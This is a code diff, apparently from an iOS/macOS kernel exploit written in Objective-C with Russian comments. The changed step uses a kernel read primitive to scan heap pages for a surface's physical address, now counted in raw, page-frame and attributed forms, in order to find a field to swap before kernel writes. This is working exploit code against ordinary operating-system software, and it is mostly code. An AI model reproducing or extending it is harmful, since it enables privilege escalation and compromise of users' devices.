@@ -5739,14 +5739,19 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
               proven ? @"ПОДТВЕРЖДЁН" : @"НЕ СОШЛОСЬ — стоп (записей не будет)"]);
     if (!backingPA || !proven) { free(ctl); return r; }
 
-    // 3. поле подмены: heap-скан (тип 0x21) на голый qword backingPA (1.9.109:
-    //    длина в ranges[0] = 0x1000 (32*32*4 БАЙТА), а не 0x4000 — пара не
-    //    матчилась. PA по heap уникален, len-проверка не нужна).
+    // 3. поле подмены: heap-скан backingPA по ВСЕМ формам (1.9.110: сырой PA
+    //    не найден на 1.9.109 — значит PFN (PA>>14) или атрибутированная
+    //    форма). Считаем попадания по каждой форме — за прогон узнаем, как
+    //    ядро хранит физику поверхности.
     uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
     uint64_t totalPages = kconstant(physSize) >> 14;
     uint64_t hitVAs[8];
     int hitN = 0;
-    for (uint64_t pg = 0; pg < totalPages && hitN < 8; pg++) {
+    uint32_t pfn32 = (uint32_t)(backingPA >> 14);
+    uint64_t pfn64 = backingPA >> 14;
+    uint64_t attrPA = backingPA | 0x8000000000000000ULL;
+    int nRaw = 0, nPfn64 = 0, nPfn32 = 0, nAttr = 0;
+    for (uint64_t pg = 0; pg < totalPages; pg++) {
         uint8_t ent[16];
         kreadbuf(tableVA + pg * 16, ent, 16);
         if (ent[2] != 0x21) continue;
@@ -5758,13 +5763,21 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         for (uint32_t o = 0; o + 8 <= sizeof(buf); o += 8) {
             uint64_t q = 0;
             memcpy(&q, buf + o, 8);
-            if (q != backingPA) continue;
-            hitVAs[hitN++] = kva + o;
-            kpNote(r, [NSString stringWithFormat:@"  ★ qword backingPA @ %#llx (heap)", (unsigned long long)(kva + o)]);
-            if (hitN >= 8) break;
+            if (q == backingPA) {
+                nRaw++;
+                if (hitN < 8) {
+                    hitVAs[hitN++] = kva + o;
+                    kpNote(r, [NSString stringWithFormat:@"  ★ сырой backingPA @ %#llx (heap)", (unsigned long long)(kva + o)]);
+                }
+                continue;
+            }
+            if (q == pfn64) { nPfn64++; continue; }
+            if (q == attrPA) { nAttr++; continue; }
+            if ((uint32_t)(q & 0xFFFFFFFF) == pfn32 || (uint32_t)(q >> 32) == pfn32) nPfn32++;
         }
     }
-    kpNote(r, [NSString stringWithFormat:@"  qword'ов с backingPA в heap: %d", hitN]);
+    kpNote(r, [NSString stringWithFormat:@"  формы backingPA %#llx в heap: raw=%d pfn64=%d pfn32=%d attr=%d",
+              (unsigned long long)backingPA, nRaw, nPfn64, nPfn32, nAttr]);
     if (!hitN) {
         kpNote(r, @"  backingPA не найден в heap — записей не будет");
         free(ctl);
